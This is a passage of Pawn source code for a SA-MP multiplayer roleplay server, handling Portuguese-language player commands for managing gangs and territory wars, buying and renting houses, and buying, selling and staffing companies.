				    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
				    return 1;
				}
				
				if(plid == playerid)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode alterar o seu próprio cargo.");
				    return 1;
				}
				
				GetPlayerGangData(plid, id, xpostid);
				
				if(gangid != id)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está na mesma gangue que o jogador.");
				    return 1;
				}
				
				post = -1;
				strmid(tmp, cmdtext, idx, strlen(cmdtext));
				
				if(strlen(tmp) > 0)
				{
				    for(new p = 0; p < sizeof GangPosts; p++)
				    {
				        if(strcmp(GangPosts[p], tmp, true) == 0)
				        {
				            post = p;
				            break;
				        }
				    }
				}
				
				if(post < 1 || post == GANG_POST_LEADER)
				{
                    SendClientMessage(playerid, COLOUR_GRAY, "USO: /gangue definircargo [id] [cargo] - CARGOS DISPONÍVEIS:");
                    SendClientMessage(playerid, COLOUR_GRAY, "soldado, piloto, olheiro, fogueteiro, traficante, torre, braco direito");
				    return 1;
				}
				
				if(postid != GANG_POST_LEADER)
				{
				    if(post == GANG_POST_TOWER || post == GANG_POST_SWORD_ARM)
				    {
				        SendClientMessage(playerid, COLOUR_GRAY, "Você não pode definir ninguém como braco direito ou torre.");
				        return 1;
				    }
				    
					if(xpostid == GANG_POST_LEADER || xpostid == GANG_POST_SWORD_ARM || xpostid == GANG_POST_TOWER)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode alterar o cargo de um líder, torre ou braco direito.");
				        return 1;
					}
				}
				
				PutPlayerInGang(plid, id, post);
				format(string, sizeof string, "Cargo de %s definido para %s.", PlayerName(plid), GangPosts[post]);
				SendClientMessage(playerid, COLOUR_SKY_BLUE, string);
				format(string, sizeof string, "%s definiu seu cargo na gangue para %s.", PlayerName(playerid), GangPosts[post]);
				SendClientMessage(plid, COLOUR_SKY_BLUE, string);
				return 1;
	        }
	        
	        else if(strcmp(gang_cmd, "definirlider", true) == 0)
	        {
	            new tmp[128], string[128];
				new plid, id, gangid, gangpost;

				GetPlayerGangData(playerid, gangid, gangpost);

				if(gangid == 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma gangue.");
	            	return 1;
				}

				if(gangpost != GANG_POST_LEADER)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não é o líder da sua gangue.");
	            	return 1;
				}

				tmp = strtok(cmdtext, idx);

				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /gangue definirlider [id]");
				    return 1;
				}

				plid = strval(tmp);

				if(!IsPlayerConnected(plid))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
				    return 1;
				}

				if(plid == playerid)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você já é o líder.");
				    return 1;
				}

				id = GetPlayerGang(plid);

				if(gangid != id)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está na mesma gangue que o jogador.");
				    return 1;
				}
				
				PutPlayerInGang(plid, id, GANG_POST_LEADER);
				PutPlayerInGang(playerid, gangid, GANG_POST_SOLDIER);
				format(string, sizeof string, "Cargo de lider da gangue definido para %s, seu cargo foi definido para soldado.", PlayerName(plid));
				SendClientMessage(playerid, COLOUR_SKY_BLUE, string);
				SendClientMessage(plid, COLOUR_SKY_BLUE, "Você recebeu o cargo de líder da sua gangue.");
				return 1;
	        }
	        
	        else if(strcmp(gang_cmd, "expulsar", true) == 0)
	        {
	            new tmp[128], string[128];
				new plid, id, gangid, gangpostid;
				
				GetPlayerGangData(playerid, gangid, gangpostid);
				
				if(gangid == 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma gangue.");
				    return 1;
				}
				
				if(gangpostid != GANG_POST_LEADER)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não é o líder da sua gangue.");
				    return 1;
				}
				
				tmp = strtok(cmdtext, idx);

				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOUR_GRAY, "USO: /gangue expulsar [id]");
					return 1;
				}

				plid = strval(tmp);
				
				if(!IsPlayerConnected(plid))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
				    return 1;
				}

				if(plid == playerid)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode se auto-expulsar.");
				    return 1;
				}
				
				id = GetPlayerGang(plid);
				
				if(gangid != id)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está na mesma gangue que o jogador.");
				    return 1;
				}
				
				if(ColourType == COLOUR_TYPE_GANG)
	        	{
	        	    new alpha;

	        	    alpha = GetPlayerColour(plid) & 0xFF;
	        	    SetPlayerColour(plid, (ColourValue & 0xFFFFFF00) | alpha);
				}
				
				RemovePlayerFromGang(plid);
				SendClientMessage(playerid, COLOUR_SKY_BLUE, "Jogador expulso da gangue.");
				format(string, sizeof string, "Você foi expulso da sua gangue por %s.", PlayerName(playerid));
				SendClientMessage(plid, COLOUR_SKY_BLUE, string);
				return 1;
	        }
	        
	        else if(strcmp(gang_cmd, "sair", true) == 0)
	        {
	            new id, post;
	            
	            GetPlayerGangData(playerid, id, post);
	            
	            if(id == 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma gangue.");
	            	return 1;
				}
				
				if(post == GANG_POST_LEADER)
	        	{
	            	SendClientMessage(playerid, COLOUR_GRAY, "Você é o líder da sua gangue.");
	            	return 1;
	        	}
	        	
	        	if(ColourType == COLOUR_TYPE_GANG)
	        	{
	        	    new alpha;
	        	    
	        	    alpha = GetPlayerColour(playerid) & 0xFF;
	        	    SetPlayerColour(playerid, (ColourValue & 0xFFFFFF00) | alpha);
				}
				
	        	RemovePlayerFromGang(playerid);
	        	SendClientMessage(playerid, COLOUR_SKY_BLUE, "Você saiu da sua gangue.");
	        	return 1;
	        }
	        
	        else if(strcmp(gang_cmd, "conquistar", true) == 0)
	        {
	            new gpath[128];
	            new zoneid, id, post;
	            
	            GetPlayerGangData(playerid, id, post);
	            
				if(id == 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma gangue.");
	            	return 1;
				}
				
				if(Zone[playerid] == -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um território de gangue.");
	            	return 1;
				}
				
				zoneid = Zone[playerid];
	            gpath = GetGangFilePath(id);
	            
	            if(post != GANG_POST_LEADER)
	        	{
	            	SendClientMessage(playerid, COLOUR_GRAY, "Você não é o líder da sua gangue.");
	            	return 1;
	        	}
	        	
	            if(hGetInt(gpath, "Conquered") != 0)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você não tem permissão para conquistar territórios no momento.");
	                return 1;
	            }
	            
	            if(GetZoneDomain(zoneid) != 0)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Este território já possui dono.");
	                return 1;
	            }
	            
	            SetZoneDomain(zoneid, id);
	            hSetInt(gpath, "Conquered", 1);
	            SendClientMessage(playerid, COLOUR_SKY_BLUE, "Território conquistado.");
	            return 1;
	        }
	        
	        else if(strcmp(gang_cmd, "atacar", true) == 0)
	        {
	            new zoneid, id;

	            id = GetPlayerGang(playerid);
	            
	            if(id == 0)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma gangue.");
	            	return 1;
	            }
	            
	            zoneid = GangAttack[playerid];
	            
	            if(zoneid == -1)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você não pode começar um ataque.");
	            	return 1;
	            }
	            
				if(GangZones[zoneid][gzAttacker] != 0)
				{
				    GangAttack[playerid] = 0;
                    SendClientMessage(playerid, COLOUR_GRAY, "Este território já está em guerra.");
	            	return 1;
				}
				
				DeleteTimer(GangZones[zoneid][gzTimer]);
				GangZoneFlashForAll(GangZones[zoneid][gzId], COLOUR_RED);
				GangZones[zoneid][gzAttacker] = id;
				GangZones[zoneid][gzScore] = 0;
				GangZones[zoneid][gzTimer] = SetTimerEx("GangZoneWar", 5000, true, "d", zoneid);

				for(new n = 0; n < MAX_SLOTS; n++)
				{
    				if(IsPlayerConnected(n) && IsPlayerLogged(n) && Zone[n] == zoneid)
						UpdatePlayerZoneText(n);
				}

				SendClientMessage(playerid, COLOUR_SKY_BLUE, "Ataque iniciado.");
				return 1;
			}
	        
	        else if(strcmp(gang_cmd, "renderse", true) == 0)
	        {
	            new zoneid, id, post;

	            GetPlayerGangData(playerid, id, post);

				if(id == 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma gangue.");
	            	return 1;
				}

				if(Zone[playerid] == -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um território de gangue.");
	            	return 1;
				}

				zoneid = Zone[playerid];

	            if(post != GANG_POST_LEADER)
	        	{
	            	SendClientMessage(playerid, COLOUR_GRAY, "Você não é o líder da sua gangue.");
	            	return 1;
	        	}
	        	
	        	if(GetZoneDomain(zoneid) == id)
	        	{
	        	    if(GangZones[zoneid][gzAttacker] == 0)
	        	    {
	        	        SendClientMessage(playerid, COLOUR_GRAY, "Este território não está sendo atacado.");
	            		return 1;
	        	    }
	        	    
	        	    SetZoneDomain(zoneid, GangZones[zoneid][gzAttacker]);
	        	    FinishWar(zoneid);
	        	    SendClientMessage(playerid, COLOUR_SKY_BLUE, "Ataque cancelado.");
	        	    return 1;
	        	}
	        	
				else if(GangZones[zoneid][gzAttacker] == id)
				{
				    FinishWar(zoneid);
				    SendClientMessage(playerid, COLOUR_SKY_BLUE, "Você perdeu o seu território por render-se.");
				    return 1;
				}
				
				SendClientMessage(playerid, COLOUR_GRAY, "Sua gangue não faz parte dessa guerra.");
				return 1;
	        }
	        
	        else if(strcmp(gang_cmd, "nome", true) == 0)
	     	{
	     	    new gname[128];
				new postid, id;

				GetPlayerGangData(playerid, id, postid);

    	        if(id == 0)
    	        {
    	            SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma gangue.");
    	            return 1;
	            }

    	        if(postid != GANG_POST_LEADER)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você não é o líder da sua gangue.");
	                return 1;
	            }

        	    strmid(gname, cmdtext, idx, strlen(cmdtext));
        	    
				if(!strlen(gname))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /gangue nome [novo nome]");
		            return 1;
				}

				if(!IsNotSpecialString(gname))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Use apenas os caracteres \"A-Z, a-z, 0-9, ', espaço ou _\" no nome da gangue.");
	       			return 1;
				}

				hSetString(GetGangFilePath(id), "Name", gname);
				for(new n = 0; n < MAX_SLOTS; n++)
				{
				    if(IsPlayerConnected(n) && IsPlayerLogged(n) && GetZoneDomain(Zone[n]) == id)
						UpdatePlayerZoneText(n);
				}

				SendClientMessage(playerid, COLOUR_SKY_BLUE, "Nome da gangue alterado.");
   				return 1;
     		}

	    	else if(strcmp(gang_cmd, "cor", true) == 0)
     		{
	    	    new colour[128];
				new id, post, gcolour;

	           	gcolour = -1;
				colour = strtok(cmdtext, idx);
				GetPlayerGangData(playerid, id, post);

	            if(id == 0)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma gangue.");
	                return 1;
	            }

	            if(post != GANG_POST_LEADER)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você não é o líder da sua gangue.");
	                return 1;
	            }

				if(strlen(colour) > 0)
				{
		    		for(new c = 0; c < sizeof GangColours; c++)
		    		{
			        	if(strcmp(GangColours[c][gColourName], colour, true) == 0)
	    	   	 		{
		    		        gcolour = c;
				            break;
				        }
				    }
				}

				if(gcolour == -1)
				{
				   	SendClientMessage(playerid, COLOUR_GRAY, "USO: /gangue cor [nova cor] - CORES DISPONÍVEIS:");
				   	SendClientMessage(playerid, COLOUR_GRAY, "branco, preto, vermelho, vermelho-escuro, verde, verde-claro, verde-escuro,");
				    SendClientMessage(playerid, COLOUR_GRAY, "azul, azul-claro, azul-escuro, azul-ceu, navy, aqua, ciano, magenta, amarelo,");
				    SendClientMessage(playerid, COLOUR_GRAY, "cinza, laranja, rosa, dourado, roxo, marrom");
		            return 1;
				}

				hSetInt(GetGangFilePath(id), "Colour", gcolour);

				for(new z = 0; z < sizeof GangZones; z++)
				{
				    if(GetZoneDomain(z) == id)
				    {
				        for(new n = 0; n < MAX_SLOTS; n++)
						{
				    		if(IsPlayerConnected(n) && IsPlayerLogged(n) && Zone[n] == z)
								UpdatePlayerZoneText(n);
						}
						
				        UpdateGangZone(z);
					}
				}

				if(ColourType == COLOUR_TYPE_GANG)
				{
					for(new n = 0; n < MAX_SLOTS; n++)
					{
					    if(IsPlayerConnected(n) && IsPlayerLogged(n))
					    {
	        				new gangid, postid;
				        
							GetPlayerGangData(n, gangid, postid);
						
							if(gangid == id)
							{
								new alpha;
								
								alpha = GetPlayerColour(n) & 0xFF;
								SetPlayerColour(n, (GangColours[gcolour][gColourHex] & 0xFFFFFF00) | alpha);
							}
					    }
					}
				}
				
				SendClientMessage(playerid, COLOUR_SKY_BLUE, "Cor da gangue alterada.");
   				return 1;
     		}
     		
     		else if(strcmp(gang_cmd, "membros", true) == 0)
     		{
     		    new string[128];
     		    new gangid;
     		    
     		    gangid = GetPlayerGang(playerid);
     		    
     		    if(gangid == 0)
    	        {
    	            SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma gangue.");
    	            return 1;
	            }
	            
	            format(string, sizeof string, "%s - Membros:", hGetString(GetGangFilePath(gangid), "Name"));
	            SendClientMessage(playerid, COLOUR_WHITE, string);
	            
	            for(new p = sizeof GangPosts - 1; p > 0; p--)
	            {
     		    	for(new n = 0; n < MAX_SLOTS; n++)
     		    	{
     		    	    if(IsPlayerConnected(n) && IsPlayerLogged(n))
     		    	    {
     		    	        new id, postid;

	     		            GetPlayerGangData(n, id, postid);

	     		            if(gangid == id && postid == p)
    	 		            {
     			                format(string, sizeof string, "[%s] %s", GangPosts[postid], PlayerName(n));
     			                SendClientMessage(playerid, COLOUR_SKY_BLUE, string);
     		    	        }
     		        	}
     		    	}
     		    }
     		    
     		    return 1;
     		}
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /gangue [comando] - COMANDOS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "criar, excluir, convidar, definircargo, definirlider, expulsar, sair,");
	    SendClientMessage(playerid, COLOUR_GRAY, "conquistar, renderse, nome, cor, membros");
	    return 1;
	}
	
	if(strcmp(cmd, "/casa", true) == 0)
	{
	    new house_cmd[128];
	    
	    house_cmd = strtok(cmdtext, idx);
	    
	    if(strlen(house_cmd) > 0)
	    {
	        if(strcmp(house_cmd, "comprar", true) == 0)
			{
			    new hpath[128], xpath[128], string[128], owner[128], rent[128];
				new value, onsale, houseid;
			    
			    xpath = GetPlayerXFilePath(playerid);
			    
			    if(!IsPlayerAdmin(playerid) && hGetInt(xpath, "Level") < MIN_LEVEL_BUY_HOUSE)
				{
					format(string, sizeof string, "Você não tem level o suficiente para comprar uma casa (Mínimo: %d)", MIN_LEVEL_BUY_HOUSE);
					SendClientMessage(playerid, COLOUR_GRAY, string);
					return 1;
				}
				
			    houseid = House[playerid];
			    
			    if(houseid == -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em uma casa.");
				    return 1;
				}
				
				hpath = GetHouseFilePath(houseid);
				
				if(hGetInt(hpath, "Deleted") == 1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em uma casa.");
				    return 1;
				}
				
				onsale = hGetInt(hpath, "OnSale");
				
				if(!onsale)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Essa casa não está a venda.");
				    return 1;
				}
				
				value = hGetInt(hpath, "Value");
				
				if(GetPlayerSysMoney(playerid) < value)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não possui dinheiro para comprar.");
				    return 1;
				}
				
				if(onsale == 1)
				{
				    owner = hGetString(hpath, "Owner");
				    xpath = GetPlayerNameXFilePath(owner);
				    
				    format(string, sizeof string, "[ Sua casa N°%d foi comprada por %s ]", houseid + 1, PlayerName(playerid));
				    SendPhoneMessage(owner, "Imobiliaria", string);
				    
                    if(hGetInt(xpath, "House") == houseid)
					{
					    hSetInt(xpath, "House", -1);
						hSetString(xpath, "Position", "1686.0055,-2239.6494,13.5469,176.8181");
					}
				}
				
				rent = hGetString(hpath, "Rent");
				
				if(strlen(rent) > 0)
				{
				    new id;
				    
				    id = GetPlayerId(rent);
					xpath = GetPlayerNameXFilePath(rent);

					if(hGetInt(xpath, "House") == houseid)
					{
					    hSetInt(xpath, "House", -1);
						hSetString(xpath, "Position", "1686.0055,-2239.6494,13.5469,176.8181");
					}
					
					if(id != INVALID_PLAYER_ID)
					    SendClientMessage(id, COLOUR_ROYAL_BLUE, "Você foi despejado de sua casa de aluguel.");

					hUnset(hpath, "Rent");
				}
				
				hSetString(hpath, "Owner", PlayerName(playerid));
				GivePlayerSysMoney(playerid, -value);
				PutPlayerOnHouse(playerid, houseid);
				PutHouseOnSale(houseid, 0);
				SendClientMessage(playerid, COLOUR_ROYAL_BLUE, "Casa adquirida, você agora irá nascer aqui.");
				return 1;
			}

			else if(strcmp(house_cmd, "vender", true) == 0)
			{
			    new hpath[128], string[128];
			    new houseid, onsale;

                houseid = House[playerid];
                
			    if(houseid == -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em uma casa.");
				    return 1;
				}

				hpath = GetHouseFilePath(houseid);

				if(hGetInt(hpath, "Deleted") == 1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em uma casa.");
				    return 1;
				}

				if(strcmp(PlayerName(playerid), hGetString(hpath, "Owner"), true))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não é o proprietário da casa.");
				    return 1;
				}

				onsale = hGetInt(hpath, "OnSale");
				
				if(!onsale)
				{
			    	
			    	format(string, sizeof string, "Casa N°%d colocada a venda.", houseid + 1);
					SendClientMessage(playerid, COLOUR_ROYAL_BLUE, string);
				}
				
				else
				{
				    format(string, sizeof string, "Casa N°%d retirada de venda.", houseid + 1);
					SendClientMessage(playerid, COLOUR_ROYAL_BLUE, string);
				}
				
				PutHouseOnSale(houseid, !onsale);
				return 1;
			}
			
			else if(strcmp(house_cmd, "alugar", true) == 0)
			{
			    new tmp[128], hpath[128], string[128];
			    new plid, houseid;

			    houseid = House[playerid];
			    
			    if(houseid == -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em uma casa.");
				    return 1;
				}

				hpath = GetHouseFilePath(houseid);
				
				if(hGetInt(hpath, "Deleted") == 1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em uma casa.");
				    return 1;
				}

				if(strcmp(PlayerName(playerid), hGetString(hpath, "Owner"), true))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não é o proprietário da casa.");
				    return 1;
				}
				
				if(hGetInt(hpath, "OnSale"))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode colocar em aluguel uma casa a venda.");
				    return 1;
				}
				
				if(strlen(hGetString(hpath, "Rent")) > 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você já alugou essa casa para outro jogador.");
				    return 1;
				}
				
				tmp = strtok(cmdtext, idx);
				
				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /casa alugar [id]");
				    return 1;
				}
				
				plid = strval(tmp);
				
				if(!IsPlayerConnected(plid))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
				    return 1;
				}
				
				format(string, sizeof string, "Casa alugada para %s.", PlayerName(plid));
				SendClientMessage(playerid, COLOUR_ROYAL_BLUE, string);
				format(string, sizeof string, "%s lhe alugou uma casa, para nascer nela digite /casa nascer", PlayerName(playerid));
				SendClientMessage(plid, COLOUR_ROYAL_BLUE, string);
				hSetString(hpath, "Rent", PlayerName(plid));
				return 1;
			}
			
			else if(strcmp(house_cmd, "despejar", true) == 0)
			{
			    new hpath[128], xpath[128], rent[128];
			    new houseid, id;
			    
			    houseid = House[playerid];

			    if(houseid == -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em uma casa.");
				    return 1;
				}

				hpath = GetHouseFilePath(houseid);

				if(hGetInt(hpath, "Deleted") == 1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em uma casa.");
				    return 1;
				}

				if(strcmp(PlayerName(playerid), hGetString(hpath, "Owner"), true))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não é o proprietário da casa.");
				    return 1;
				}
				
				rent = hGetString(hpath, "Rent");
				
				if(!strlen(rent))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não alugou essa cara para nenhum jogador.");
				    return 1;
				}
				
				id = GetPlayerId(rent);
				xpath = GetPlayerNameXFilePath(rent);
				
				if(hGetInt(xpath, "House") == houseid)
				{
				    hSetInt(xpath, "House", -1);
					hSetString(xpath, "Position", "1686.0055,-2239.6494,13.5469,176.8181");
				}
				
				if(id != INVALID_PLAYER_ID)
				    SendClientMessage(id, COLOUR_ROYAL_BLUE, "Você foi despejado de sua casa de aluguel.");
				
				hUnset(hpath, "Rent");
				SendClientMessage(playerid, COLOUR_ROYAL_BLUE, "Jogador despejado.");
				return 1;
			}
			
			else if(strcmp(house_cmd, "nascer", true) == 0)
			{
			    new hpath[128];
			    new houseid;
			    
			    houseid = House[playerid];
			    
			    if(houseid == -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em uma casa.");
				    return 1;
				}

				hpath = GetHouseFilePath(houseid);

				if(hGetInt(hpath, "Deleted") == 1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em uma casa.");
				    return 1;
				}
				
				if(strcmp(PlayerName(playerid), hGetString(hpath, "Owner"), true) && strcmp(PlayerName(playerid), hGetString(hpath, "Rent"), true))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não é o proprietário da casa.");
				    return 1;
				}
				
				PutPlayerOnHouse(playerid, houseid);
				SendClientMessage(playerid, COLOUR_ROYAL_BLUE, "Você agora irá nascer aqui.");
				return 1;
			}
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /casa [comando] - COMANDOS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "comprar, vender, alugar, despejar, nascer");
	    return 1;
	}
	
	if(strcmp(cmd, "/empresa", true) == 0)
	{
	    new com_cmd[128];

	    com_cmd = strtok(cmdtext, idx);

	    if(strlen(com_cmd) > 0)
	    {
	        if(strcmp(com_cmd, "comprar", true) == 0)
			{
			    new xpath[128], cpath[128];
			    new com, value, money;
			    new bool:own;
			    
			    xpath = GetPlayerXFilePath(playerid);

			    if(!IsPlayerAdmin(playerid) && hGetInt(xpath, "Level") < MIN_LEVEL_BUY_COMPANY)
				{
				    new string[128];
					format(string, sizeof string, "Você não tem level o suficiente para comprar uma empresa (Mínimo: %d)", MIN_LEVEL_BUY_COMPANY);
					SendClientMessage(playerid, COLOUR_GRAY, string);
					return 1;
				}
				
			    com = Company[playerid];
			    
			    if(com == 0)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma empresa.");
				    return 1;
			    }
			    
			    value = Companies[com][cValue];
			    
			    if(value <= 0)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Essa é uma empresa pública, você não pode comprá-la.");
				    return 1;
			    }
			    
				cpath = GetCompanyFilePath(com);
				own = false;
				
				if(strlen(hGetString(cpath, "Owner")) > 0)
				{
				    if(hGetInt(cpath, "Value") <= 0)
				    {
				        SendClientMessage(playerid, COLOUR_GRAY, "Essa empresa não está a venda.");
				    	return 1;
				    }
				    
				    value = hGetInt(cpath, "Value");
				    own = true;
				}
				
				money = GetPlayerSysMoney(playerid);

			    if(money < value)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Você não possui dinheiro.");
				    return 1;
			    }
			    
			    if(own)
			    {
			        new oxpath[128], owner[128], string[128], prop[128];

				    owner = hGetString(cpath, "Owner");
					oxpath = GetPlayerNameXFilePath(owner);
					value = hGetInt(cpath, "Value");

					hSetInt(oxpath, "Bank", hGetInt(oxpath, "Bank") + value);
					format(prop, sizeof prop, "%s \"%s\"", Companies[com][cType], Companies[com][cName]);
					format(string, sizeof string, "[ Empresa comprada por %s (Banco +$%d,00 dólares) ]", PlayerName(playerid), value);
					SendPhoneMessage(owner, prop, string);
			    }
			    
				GivePlayerSysMoney(playerid, -value);
				hSetString(cpath, "Owner", PlayerName(playerid));
				hSetInt(cpath, "Value", 0);
				hSetInt(cpath, "Balance", 0);
				hSetInt(cpath, "Investment", 0);
				SendClientMessage(playerid, COLOUR_GOLD, "Empresa adquirida.");
				return 1;
			}
			
			else if(strcmp(com_cmd, "vender", true) == 0)
			{
                new cpath[128];
			    new com, value, cvalue;

			    com = Company[playerid];
			    
			    if(com == 0)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma empresa.");
				    return 1;
			    }

			    cvalue = Companies[com][cValue];
			    
			    if(cvalue <= 0)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Essa é uma empresa pública.");
				    return 1;
			    }
			    
			    value = strval(strtok(cmdtext, idx));
			    
			    if(value < cvalue / 2)
			    {
			        new errmsg[128];
			        format(errmsg, sizeof errmsg, "Valor inválido, você deve colocar um acima de $%d,00 dólares.", cvalue / 2);
			        SendClientMessage(playerid, COLOUR_GRAY, errmsg);
				    return 1;
			    }
			    
			    cpath = GetCompanyFilePath(com);
			    
			    if(!strlen(hGetString(cpath, "Owner")))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Essa empresa não possui dono.");
				    return 1;
				}
				
				if(strcmp(PlayerName(playerid), hGetString(cpath, "Owner")) != 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não é o dono dessa empresa.");
				    return 1;
				}
				
				if(hGetInt(cpath, "Value") > 0)
				{
				    hSetInt(cpath, "Value", 0);
				    SendClientMessage(playerid, COLOUR_GOLD, "Empresa retirada de venda.");
				    return 1;
				}
				
				hSetInt(cpath, "Value", value);
				SendClientMessage(playerid, COLOUR_GOLD, "Empresa colocada a venda.");
				return 1;
			}
			
			else if(strcmp(com_cmd, "fechar", true) == 0)
			{
                new cpath[128], string[128];
			    new com, value;

			    com = Company[playerid];

			    if(com == 0)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma empresa.");
				    return 1;
			    }
			    
			    value = Companies[com][cValue];

			    if(value <= 0)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Essa é uma empresa pública.");
				    return 1;
			    }
			    
			    cpath = GetCompanyFilePath(com);

			    if(!strlen(hGetString(cpath, "Owner")))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Essa empresa não possui dono.");
				    return 1;
				}

				if(strcmp(PlayerName(playerid), hGetString(cpath, "Owner")) != 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não é o dono dessa empresa.");
				    return 1;
				}
				
				value = hGetInt(cpath, "Balance") + hGetInt(cpath, "Investment") / 2;
				
				if(value < 0)
				    value = 0;
				    
				SendClientMessage(playerid, COLOUR_GOLD, "Empresa fechada, agora ela pertence ao governo.");
				format(string, sizeof string, "Você recebeu seus investimentos: $%d,00 dólares", value);
				SendClientMessage(playerid, COLOUR_GOLD, string);
				GivePlayerSysMoney(playerid, value);
				DeleteCompany(com);
				return 1;
			}
			
			else if(strcmp(com_cmd, "contratar", true) == 0)
			{
				new tmp[128], cpath[128], xpath[128], string[1024];
				new plid, com, post, reward, payday, jobid;
				new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;
				
				tmp = strtok(cmdtext, idx);
				
				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /empresa contratar [id] [cargo] - CARGOS DISPONÍVEIS:");
				    SendClientMessage(playerid, COLOUR_GRAY, "funcionario, socio");
				    return 1;
				}
				
				plid = strval(tmp);
				
				if(!IsPlayerConnected(plid))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
				    return 1;
				}
				
				GetPlayerPos(playerid, X, Y, Z);
				GetPlayerPos(plid, PX, PY, PZ);
				
				if(GetDistance(X, Y, Z, PX, PY, PZ) > NAME_TAG_DRAW_DISTANCE)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Chegue mais perto do jogador.");
				    return 1;
				}
				
				tmp = strtok(cmdtext, idx);
				post = -1;
				
				if(strlen(tmp) > 0)
				{
					if(strcmp(tmp, "funcionario", true) == 0)
					    post = COMPANY_POST_EMPLOYEE;
					    
					if(strcmp(tmp, "socio", true) == 0)
					    post = COMPANY_POST_PARTNER;
				}
				
				if(post == -1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /empresa contratar [id] [cargo] - CARGOS DISPONÍVEIS:");
				    SendClientMessage(playerid, COLOUR_GRAY, "funcionario, socio");
				    return 1;
				}
				
				if(post == COMPANY_POST_EMPLOYEE)
				{
					xpath = GetPlayerXFilePath(plid);
					jobid = hGetInt(xpath, "Job");
				
					if(jobid == 0)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador está desempregado.");
					    return 1;
					}
				
					com = -1;
					for(new c = 1; c < sizeof Companies; c++)
					{
					    if(Companies[c][cValue] > 0 && Companies[c][cJob] == jobid)
					    {
					        com = c;
					        break;
					    }
					}
				
					if(com == -1)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador trabalha em uma empresa pública.");
					    return 1;
					}
				
					cpath = GetCompanyFilePath(com);
				
					if(!strlen(hGetString(cpath, "Owner")))
					{
